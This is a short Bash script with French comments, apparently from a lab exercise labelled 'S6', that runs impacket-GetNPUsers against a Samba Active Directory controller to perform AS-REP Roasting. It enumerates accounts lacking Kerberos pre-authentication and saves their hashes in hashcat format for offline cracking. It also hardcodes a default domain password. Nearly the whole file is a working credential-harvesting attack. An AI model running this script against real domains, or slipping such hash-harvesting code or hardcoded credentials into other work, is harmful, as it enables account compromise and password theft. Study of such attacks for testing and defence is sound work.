#!/usr/bin/env bash
# S6 — AS-REP Roasting : énumération des comptes sans pré-authentification
# Cible : Samba AD DC srv-pme.nyx.tg (10.0.1.20)
#
# Usage :
#   ./asrep_roast.sh                       # creds par défaut
#   DOMAIN=nyx.tg AUTH_USER=dir1 AUTH_PASS='xxx' ./asrep_roast.sh
#   DOMAIN=nyx.tg USERSFILE=./custom_users.txt ./asrep_roast.sh

set -euo pipefail

DOMAIN="${DOMAIN:-nyx.tg}"
DC_IP="${DC_IP:-10.0.1.20}"
AUTH_USER="${AUTH_USER:-dir1}"
AUTH_PASS="${AUTH_PASS:-Nyx2026!}"
OUTDIR="${OUTDIR:-./logs}"
OUTFILE="${OUTFILE:-${OUTDIR}/asrep_hashes.txt}"
USERSFILE="${USERSFILE:-}"

mkdir -p "${OUTDIR}"

echo "=== S6 — AS-REP Roasting (GetNPUsers) ==="
echo "  Cible  : ${DC_IP} (${DOMAIN})"
echo "  User   : ${AUTH_USER}"
echo "  Output : ${OUTFILE}"
echo ""

if [ -n "${USERSFILE}" ]; then
    echo "  Users  : ${USERSFILE} (liste fournie)"
    impacket-GetNPUsers \
        "${DOMAIN}/" \
        -dc-ip "${DC_IP}" \
        -usersfile "${USERSFILE}" \
        -format hashcat \
        -outputfile "${OUTFILE}"
else
    echo "  Users  : énumération automatique (via creds fournis)"
    impacket-GetNPUsers \
        "${DOMAIN}/${AUTH_USER}:${AUTH_PASS}" \
        -dc-ip "${DC_IP}" \
        -request \
        -format hashcat \
        -outputfile "${OUTFILE}"
fi

echo ""
echo "=== Terminé ==="
echo "Hashes AS-REP sauvegardés dans ${OUTFILE}"
wc -l "${OUTFILE}" 2>/dev/null || echo "(fichier vide — aucun compte sans pré-auth ?)"
